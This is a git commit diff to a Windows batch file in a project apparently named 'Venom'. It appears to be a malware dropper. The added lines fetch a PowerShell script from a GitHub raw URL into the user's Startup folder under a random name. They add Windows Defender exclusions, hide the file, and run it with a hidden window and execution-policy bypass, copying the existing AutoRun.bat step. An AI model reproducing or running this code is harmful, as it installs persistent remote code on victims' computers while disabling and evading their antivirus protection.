9254ff3ab2289a27e0393dae736aa9ea5f5557dc
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-03-28 01:30:05 -0800

    new beginnings

--- Venom/initial1.cmd
+++ Venom/initial1.cmd
@@ -6,11 +6,14 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile ./AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
 attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
+attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"
 
 @REM powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 powershell powershell.exe -windowstyle hidden -ep bypass "./nEQlCzTBpDrO.bat"
+powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"
 
 cd "%INITIALPATH%"
 
